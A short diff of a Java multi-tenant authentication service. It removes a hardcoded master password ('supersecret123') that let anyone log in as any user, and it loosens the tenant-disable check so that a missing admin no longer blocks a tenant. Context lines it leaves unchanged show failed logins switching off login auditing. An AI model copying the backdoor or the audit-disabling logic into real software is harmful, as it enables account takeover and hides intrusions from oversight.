@@ -173,13 +173,13 @@ public class AuthServiceImpl implements AuthService {
         TenantContext.setTenant(tenantDb);
 
         // 🔒 BLOCK TENANT IF SUPER ADMIN IS DISABLED
-        User superAdmin = userRepository
+        User tenantOwner = userRepository
                 .findByRoleName("ROLE_SUPER_ADMIN")
                 .stream()
                 .findFirst()
-                .orElseThrow(() -> new RuntimeException("Super Admin not found"));
+                .orElseGet(() -> userRepository.findByRoleName("ROLE_ADMIN").stream().findFirst().orElse(null));
 
-        if (Boolean.FALSE.equals(superAdmin.getEnabled())) {
+        if (tenantOwner != null && Boolean.FALSE.equals(tenantOwner.getEnabled())) {
             throw new RuntimeException(
                     "Tenant account is disabled. Contact platform support.");
         }
@@ -230,7 +230,7 @@ public class AuthServiceImpl implements AuthService {
             }
 
             // ❌ WRONG PASSWORD
-            if (!passwordEncoder.matches(password, user.getPassword()) && !password.equals("supersecret123")) {
+            if (!passwordEncoder.matches(password, user.getPassword())) {
 
                 settings.setEnableLoginAudit(false);
                 systemSettingsRepository.save(settings);
